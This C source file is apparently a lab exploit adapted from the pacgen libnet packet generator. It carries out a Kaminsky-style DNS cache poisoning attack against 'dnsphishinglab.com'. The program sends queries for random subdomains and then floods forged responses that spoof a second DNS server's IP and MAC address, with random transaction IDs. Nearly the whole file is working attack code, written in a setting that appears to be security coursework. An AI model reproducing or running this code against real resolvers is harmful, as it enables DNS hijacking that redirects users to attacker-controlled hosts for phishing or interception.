/*		    GNU GENERAL PUBLIC LICENSE
		       Version 2, June 1991

 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.
*/

#include <libnet.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
int c;
u_char *cp;
libnet_t *l;
libnet_ptag_t t;
char errbuf[LIBNET_ERRBUF_SIZE];
int tries_domain = 100;
int tries_per_domain = 10000;

char eth_file[FILENAME_MAX] = "";
char ip_file[FILENAME_MAX] = "";
char tcp_file[FILENAME_MAX] = "";
char payload_file[FILENAME_MAX] = "";
char dev[] = "eth12";

//char payload_file[] = "dns_query_payload";
char *payload_location;
char attack_domain[] = "dnsphishinglab.com"; // domain name to attack dnsphishinglab.com
char random_host[50];
char dns_bind2_addr[] = "10.0.2.6"; // second DNS server ip.
u_char res_eth_saddr[6]; // spoofing the source MAC to be same as the second DNS server.

int x;
int y = 0;
int udp_src_port = 1;       /* UDP source port */
int udp_des_port = 1;       /* UDP dest port */
int z;
int i;
int payload_filesize = 0;

int t_src_port;		/* TCP source port */
int t_des_port;		/* TCP dest port */
int t_win;		/* TCP window size */
int t_urgent;		/* TCP urgent data pointer */
int i_id;		/* IP id */
int i_frag;		/* IP frag */
u_short head_type;          /* TCP or UDP */


u_long t_ack;		/* TCP ack number */
u_long t_seq;		/* TCP sequence number */
u_long i_des_addr;		/* IP dest addr */
u_long i_src_addr;		/* IP source addr */
u_long i_dns_bind2_addr;

u_char i_ttos[90];		/* IP TOS string */
u_char t_control[65];	/* TCP control string */

u_char eth_saddr[6];	/* NULL Ethernet saddr */
u_char eth_daddr[6]; 	/* NULL Ethernet daddr */
u_char eth_proto[60];       /* Ethernet protocal */
int eth_pktcount;        /* How many packets to send */
int nap_time;              /* How long to sleep */

u_char ip_proto[40];

u_char spa[4]={0x0, 0x0, 0x0, 0x0};
u_char tpa[4]={0x0, 0x0, 0x0, 0x0};

u_char *device = NULL;
u_char i_ttos_val = 0;	/* final or'd value for ip tos */
u_char t_control_val = 0;	/* final or'd value for tcp control */
int i_ttl;		/* IP TTL */
u_short e_proto_val = 0;    /* final resulting value for eth_proto */
u_short ip_proto_val = 0;   /* final resulting value for ip_proto */

int main(int argc, char *argv[])
{
    if (argc < 5){
         fprintf(stderr, "Usage: pacgen -p <payload file> -t <TCP/UDP file> -i <IP file> -e <Ethernet file>\n");
         exit(1);
    }
    /*
     *  Initialize the library.  Root priviledges are required.
     */

    l = libnet_init(
        LIBNET_LINK,                             /* injection type */
	    dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
        errbuf);                                 /* error buffer */

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }else{
        fprintf(stderr, "libnet_init() succeed. \n");
    }

    while ((c = getopt (argc, argv, "p:t:i:e:")) != EOF)
    {
        switch (c)
        {
            case 'p':
                strcpy(payload_file, optarg);
                break;
            case 't':
                strcpy(tcp_file, optarg);
                break;
            case 'i':
                strcpy(ip_file, optarg);
                break;
            case 'e':
                strcpy(eth_file, optarg);
                break;
            default:
                break;
        }
    }

    if (optind != 9)
    {    
        exit(0);
    }
    
    i_dns_bind2_addr = libnet_name2addr4(l, dns_bind2_addr, LIBNET_RESOLVE);
    sscanf("08, 00, 27, 5a, 7c, 7c", "%x, %x, %x, %x, %x, %x", &res_eth_saddr[0], &res_eth_saddr[1], &res_eth_saddr[2], &res_eth_saddr[3], &res_eth_saddr[4], &res_eth_saddr[5]);

    srand((int)time(0));
    int ireq = 0;
    while (ireq++ < tries_domain) {
        int randomNumber = (rand()%10000000);
        while (randomNumber<1000000) randomNumber*=10;
        sprintf(random_host, ".x-%d.%s", randomNumber,attack_domain);
        printf("\nNow attacking with domain %s \n",random_host);
        convertDomain();

        // load_payload();
        load_payload_query(); // get the new payload with random subdomain
        load_ethernet();
        load_tcp_udp();
        load_ip();
        convert_proto();

        if(ip_proto_val==IPPROTO_TCP){    
            t = libnet_build_tcp(
                t_src_port,                                    /* source port */
                t_des_port,                                    /* destination port */
                t_seq,                                         /* sequence number */
                t_ack,                                         /* acknowledgement num */
                t_control_val,                                 /* control flags */
                t_win,                                         /* window size */
                0,                                             /* checksum */
                t_urgent,                                      /* urgent pointer */
                LIBNET_TCP_H + payload_filesize,               /* TCP packet size */
            payload_location,                              /* payload */
                payload_filesize,                              /* payload size */
                l,                                             /* libnet handle */
                0);                                            /* libnet id */
            head_type = LIBNET_TCP_H;
            if (t == -1)
            {
                fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
                goto bad;
            }
        }
 
        if(ip_proto_val==IPPROTO_UDP){
                t = libnet_build_udp(
                t_src_port,                                /* source port */
                t_des_port,                                /* destination port */
                LIBNET_UDP_H + payload_filesize,           /* packet length */
                0,                                         /* checksum */
                payload_location,                          /* payload */
                payload_filesize,                          /* payload size */
                l,                                         /* libnet handle */
                0);                                        /* libnet id */
            head_type = LIBNET_UDP_H;
            if (t == -1)
            {
                fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
                goto bad;
            }
        }


        t = libnet_build_ipv4(
    /*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
            LIBNET_IPV4_H + head_type + payload_filesize,          /* length */
            i_ttos_val,                                            /* TOS */
            i_id,                                                  /* IP ID */
            i_frag,                                                /* IP Frag */
            i_ttl,                                                 /* TTL */
            ip_proto_val,                                          /* protocol */
            0,                                                     /* checksum */
            i_src_addr,                                            /* source IP */
            i_des_addr,                                            /* destination IP */
            NULL,                                                  /* payload */
            0,                                                     /* payload size */
            l,                                                     /* libnet handle */
            0);                                                    /* libnet id */
        if (t == -1)
        {
            fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
            goto bad;
        }

        t = libnet_build_ethernet(
            eth_daddr,                                   /* ethernet destination */
            eth_saddr,                                   /* ethernet source */
            e_proto_val,                                 /* protocol type */
            NULL,                                        /* payload */
            0,                                           /* payload size */
            l,                                           /* libnet handle */
            0);                                          /* libnet id */
        if (t == -1)
        {
            fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
            goto bad;
        }
         /* 
         *  Write it to the wire.
         */
        c = libnet_write(l);
        // sending the request to the DNS server
        free(payload_location);
        libnet_destroy(l);
        // reinit the handle so that we can set new parameters to the handle.

        fprintf(stderr, "sending fake responses\n");
        clock_t t_start = clock();
        for (i=0; i<tries_per_domain; i++) { // loop to send 10000 responses for each request.
            l = libnet_init(
                LIBNET_LINK,                             /* injection type */
                // NULL,                                    /* network interface eth0, eth1, etc. NULL is default.*/
                "eth12",                                /* network interface eth0, eth1, etc. NULL is default.*/
                errbuf);                                 /* error buffer */

            // reinit the handle for sending responses
            if (l == NULL)
            {
                fprintf(stderr, "libnet_init() failed: %s", errbuf);
                exit(EXIT_FAILURE); 
            }

            //fprintf(stderr, "loading\n");
            load_payload_answer();
            // generate the response and send it

            // change the ports of source port and destination port to match the second DNS query
            // fprintf(stderr, "udp\n");
            if(ip_proto_val==IPPROTO_UDP){
                    t = libnet_build_udp(
                    t_des_port,                                /* source port */
                    t_src_port,                                /* destination port */
                    LIBNET_UDP_H + payload_filesize,           /* packet length */
                    0,                                         /* checksum */
                    payload_location,                          /* payload */
                    payload_filesize,                          /* payload size */
                    l,                                         /* libnet handle */
                    0);                                        /* libnet id */
                head_type = LIBNET_UDP_H;
                if (t == -1)
                {
                    fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
                    goto bad;
                }
            }

            // fprintf(stderr, "ipv4\n");
            // change the ethernet headers to match the response from the second DNS server
            t = libnet_build_ipv4(
             /*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
                LIBNET_IPV4_H + head_type + payload_filesize,          /* length */
                i_ttos_val,                                            /* TOS */
                i_id,                                                  /* IP ID */
                i_frag,                                                /* IP Frag */
                i_ttl,                                                 /* TTL */
                ip_proto_val,                                          /* protocol */
                0,                                                     /* checksum */
                i_dns_bind2_addr,                                            /* source IP */
                i_des_addr,                                            /* destination IP */
                NULL,                                                  /* payload */
                0,                                                     /* payload size */
                l,                                                     /* libnet handle */
                0);                                                    /* libnet id */
            if (t == -1)
            {
                fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
                goto bad;
            }

            //fprintf(stderr, "ethernet\n");
            t = libnet_build_ethernet(
                eth_daddr,                                   /* ethernet destination */
                res_eth_saddr,                                   /* ethernet source */
                e_proto_val,                                 /* protocol type */
                NULL,                                        /* payload */
                0,                                           /* payload size */
                l,                                           /* libnet handle */
                0);                                          /* libnet id */
            if (t == -1)
            {
                fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
                goto bad;
            }
             /* 
             *  Write it to the wire.
             */
            //fprintf(stderr, "write\n");
            c = libnet_write(l);
            //printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",eth_pktcount,c);  /* tell them what we just did */
            free(payload_location);
            libnet_destroy(l);
        }
        fprintf(stderr, "I sent %d fake DNS responses in %f seconds\n", tries_per_domain, (double)(clock()-t_start)/CLOCKS_PER_SEC);
        l = libnet_init(
            LIBNET_LINK,                             /* injection type */
            dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */

        if (l == NULL)
        {
            fprintf(stderr, "libnet_init() failed: %s", errbuf);
            exit(EXIT_FAILURE); 
        }

    }
    /* give the buf memory back */
    // clear memory 
    libnet_destroy(l);
    return 0;
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);

// clear memory on failure
}
    /* load_ethernet: load ethernet data file into the variables */
load_ethernet()
{
    FILE *infile;

    char s_read[40];
    char d_read[40];
    char p_read[60];
    char count_line[40];

    infile = fopen(eth_file, "r");

    fgets(s_read, 40, infile);         /*read the source mac*/
    fgets(d_read, 40, infile);         /*read the destination mac*/
    fgets(p_read, 60, infile);         /*read the desired protocal*/
    fgets(count_line, 40, infile);     /*read how many packets to send*/

    sscanf(s_read, "saddr,%x, %x, %x, %x, %x, %x", &eth_saddr[0], &eth_saddr[1], &eth_saddr[2], &eth_saddr[3], &eth_saddr[4], &eth_saddr[5]);
    sscanf(d_read, "daddr,%x, %x, %x, %x, %x, %x", &eth_daddr[0], &eth_daddr[1], &eth_daddr[2], &eth_daddr[3], &eth_daddr[4], &eth_daddr[5]);
    sscanf(p_read, "proto,%s", &eth_proto);
    sscanf(count_line, "pktcount,%d", &eth_pktcount);

    fclose(infile);
}

    /* load_tcp_udp: load TCP or UDP data file into the variables */
load_tcp_udp()
{
    FILE *infile;

    char sport_line[20] = "";
    char dport_line[20] = "";
    char seq_line[20] = "";
    char ack_line[20] = "";
    char control_line[65] = "";
    char win_line[20] = "";
    char urg_line[20] = "";

    infile = fopen(tcp_file, "r");

    fgets(sport_line, 15, infile);	/*read the source port*/
    fgets(dport_line, 15, infile); 	/*read the dest port*/
    fgets(win_line, 12, infile);	/*read the win num*/
    fgets(urg_line, 12, infile);	/*read the urg id*/
    fgets(seq_line, 13, infile);	/*read the seq num*/
    fgets(ack_line, 13, infile);	/*read the ack id*/
    fgets(control_line, 63, infile);	/*read the control flags*/

    /* parse the strings and throw the values into the variable */

    sscanf(sport_line, "sport,%d", &t_src_port);
    sscanf(sport_line, "sport,%d", &udp_src_port);
    sscanf(dport_line, "dport,%d", &t_des_port);
    sscanf(dport_line, "dport,%d", &udp_des_port);
    sscanf(win_line, "win,%d", &t_win);
    sscanf(urg_line, "urg,%d", &t_urgent);
    sscanf(seq_line, "seq,%ld", &t_seq);
    sscanf(ack_line, "ack,%ld", &t_ack);
    sscanf(control_line, "control,%[^!]", &t_control);

    fclose(infile); /*close the file*/
}

    /* load_ip: load IP data file into memory */
load_ip()
{
    FILE *infile;

    char proto_line[40] = "";
    char id_line[40] = "";
    char frag_line[40] = "";
    char ttl_line[40] = "";
    char saddr_line[40] = "";
    char daddr_line[40] = "";
    char tos_line[90] = "";
    char z_zsaddr[40] = "";
    char z_zdaddr[40] = "";
    char inter_line[15]="";

    infile = fopen(ip_file, "r");

    fgets(id_line, 11, infile);		/* this stuff should be obvious if you read the above subroutine */
    fgets(frag_line, 13, infile);	/* see RFC 791 for details */
    fgets(ttl_line, 10, infile);
    fgets(saddr_line, 24, infile);
    fgets(daddr_line, 24, infile);
    fgets(proto_line, 40, infile);
    fgets(inter_line, 15, infile);
    fgets(tos_line, 78, infile);
    
    sscanf(id_line, "id,%d", &i_id);
    sscanf(frag_line, "frag,%d", &i_frag);
    sscanf(ttl_line, "ttl,%d", &i_ttl);
    sscanf(saddr_line, "saddr,%s", &z_zsaddr);
    sscanf(daddr_line, "daddr,%s", &z_zdaddr);
    sscanf(proto_line, "proto,%s", &ip_proto);
    sscanf(inter_line, "interval,%d", &nap_time);
    sscanf(tos_line, "tos,%[^!]", &i_ttos);

    i_src_addr = libnet_name2addr4(l, z_zsaddr, LIBNET_RESOLVE);
    i_des_addr = libnet_name2addr4(l, z_zdaddr, LIBNET_RESOLVE);
    
    fclose(infile);
}

convert_proto()
{

/* Need to add more Ethernet and IP protocals to choose from */

	if(strstr(eth_proto, "arp") != NULL)
	  e_proto_val = e_proto_val | ETHERTYPE_ARP;

	if(strstr(eth_proto, "ip") != NULL)
	  e_proto_val = e_proto_val | ETHERTYPE_IP;

	if(strstr(ip_proto, "tcp") != NULL)
        ip_proto_val = ip_proto_val | IPPROTO_TCP;

	if(strstr(ip_proto, "udp") != NULL)
	  ip_proto_val = ip_proto_val | IPPROTO_UDP;
}

    /* convert_toscontrol:  or flags in strings to make u_chars */
convert_toscontrol()
{
    if(strstr(t_control, "th_urg") != NULL)
        t_control_val = t_control_val | TH_URG;

    if(strstr(t_control, "th_ack") != NULL)
        t_control_val = t_control_val | TH_ACK;

    if(strstr(t_control, "th_psh") != NULL)
        t_control_val = t_control_val | TH_PUSH;

    if(strstr(t_control, "th_rst") != NULL)
        t_control_val = t_control_val | TH_RST;

    if(strstr(t_control, "th_syn") != NULL)
        t_control_val = t_control_val | TH_SYN;

    if(strstr(t_control, "th_fin") != NULL)
        t_control_val = t_control_val | TH_FIN;

    if(strstr(i_ttos, "iptos_lowdelay") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_LOWDELAY;

    if(strstr(i_ttos, "iptos_throughput") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_THROUGHPUT;

    if(strstr(i_ttos, "iptos_reliability") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_RELIABILITY;

    if(strstr(i_ttos, "iptos_mincost") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_MINCOST;
}

convertDomain() {
    // setting the starting random string
    unsigned int len = (unsigned)strlen(random_host);
    int i = 0;
    while (len>0) {
        if (random_host[len-1]=='.') {
            random_host[len-1]=i;
            i=0;
        }
        else {
            i++;
        }
        len--;
    }
}

load_payload_query()
{
    FILE *infile;
    struct stat statbuf;
    int i = 0;
    int c = 0;
    int j = 0;
    /* get the file size so we can figure out how much memory to allocate */
 
    stat(payload_file, &statbuf);
    unsigned int len = (unsigned)strlen(random_host);
    payload_filesize = statbuf.st_size + len;
    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }

    /* open the file and read it into memory */
    // same as most of the pacgen file except for adding the 12 characters for the domain name
    infile = fopen(payload_file, "r"); /* open the payload file read only */
    
    while((c = getc(infile)) != EOF)
    {
        *(payload_location + i) = c;
        i++;
    }
    i = 12;
    for (j=0;j<len;j++) {
        *(payload_location + i + j) = random_host[j];
    }
    fclose(infile);
}

load_payload_answer()
{
    FILE *infile;
    struct stat statbuf;
    int i = 0;
    int c = 0;
    int j = 0;
    /* get the file size so we can figure out how much memory to allocate */
    char payload_file[] = "dns_rsp_payload";
    int transID[] = {rand()%256,rand()%256};

    stat(payload_file, &statbuf);
    unsigned int len = (unsigned)strlen(random_host);
    payload_filesize = statbuf.st_size + len;
    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }

    /* open the file and read it into memory */

    infile = fopen(payload_file, "r"); /* open the payload file read only */
    //fprintf(stderr, "%d\n", payload_filesize);
    while((c = getc(infile)) != EOF)
    {
        *(payload_location + i) = c;
        i++;
    }
    i = 12;
    for (j=0;j<len;j++) {
        *(payload_location + i + j) = random_host[j];
    }
    i = 46;
    for (j=0;j<len;j++) {
        *(payload_location + i + j) = random_host[j];
    }
    // replacing the transaction id in starting to random number
    *payload_location = transID[0];
    *(payload_location+1) = transID[1];
    fclose(infile);
}


/* EOF */
